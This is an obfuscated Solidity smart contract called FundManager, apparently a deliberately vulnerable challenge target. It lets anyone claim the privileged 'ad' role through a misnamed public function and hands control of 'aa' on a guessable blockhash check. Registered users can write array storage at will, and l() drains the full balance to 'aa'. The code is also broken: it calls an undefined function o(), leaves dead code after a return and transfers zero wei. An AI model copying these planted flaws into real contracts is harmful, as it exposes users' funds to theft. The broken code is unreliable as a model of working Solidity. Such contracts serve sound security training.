pragma solidity ^0.4.23;

contract FundManager {


address public aa = 0x0;
address public ad;
address public j = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public f = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public u;

mapping(address=>bool) d;

uint256 public y;
uint256[] public af = [951828771,158769871220];
uint256[] public balance;


function DranMe() public payable{
	ad = msg.sender;
}


modifier q() {
    require(msg.sender == ad);
    _;
}

modifier m() {
    require(msg.sender == aa);
    _;
}

modifier k() {
    require(d[msg.sender]);
    _;
}


function n() public constant returns(uint256) {
	return af.length;
}

function r(uint256 v) public payable q{
	y = v;
}

function e() public constant returns(uint256) {
	return u.length;
}

function t() public constant returns(uint256) {
	return address(this).balance;
}

function g() public payable{
	require(msg.value >= 0.02 ether);
	u.push(msg.sender);
	d[msg.sender]=true;
}

function b() public payable k{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=ad || h()){
	    uint256 ab = 0;
        msg.sender.transfer(ab);
	}
}

function h() private returns(bool){
    bytes32 ag = o(blockhash(block.number-1));
    uint256 y = uint256(ag);
        if(y%5==0){
            aa = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function c () public payable k {
	require (msg.value >= 0.005 ether);
	j.call.value(msg.value)();
}

function a () public payable k {
	require (msg.value >= 0.005 ether);
	f.call.value(msg.value)();
}

function x (uint256 ac, uint256 z) public payable k {
	af[ac] = z;
}

function w (uint256 ah) public payable k {
	af.length = ah;
}

function p (uint256 ae) public payable k returns(uint256) {
	return (ae / (af[0]*af[1]));
	if((ae / (af[0]*af[1])) == y) {
		ad = aa;
	}
}

function i () public payable k returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == y){
        return true;
    }
}

function s() public payable q {
	ad.call.value(1 wei)();
}

function l() public payable m {
	aa.transfer(address(this).balance);
}


function() public payable{
	}
}